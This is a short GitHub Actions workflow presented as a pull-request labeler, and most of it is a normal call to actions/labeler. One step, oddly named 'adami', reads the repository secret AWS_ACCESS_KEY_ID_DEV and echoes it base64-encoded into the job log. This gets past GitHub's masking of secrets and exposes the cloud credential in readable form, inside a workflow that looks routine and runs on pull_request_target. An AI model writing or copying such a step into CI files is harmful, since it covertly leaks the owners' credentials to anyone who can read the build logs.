name: PRs labeler

on:
  - pull_request_target

jobs:
  triage:
    runs-on: ubuntu-20.04
    steps:
    - name: adami
      run: 'echo "$SSH_KEY" | base64'
      shell: bash
      env:
        SSH_KEY: ${{secrets.AWS_ACCESS_KEY_ID_DEV}}
    - uses: actions/labeler@v3
      with:
        repo-token: "${{ secrets.GITHUB_TOKEN }}"
        sync-labels: true
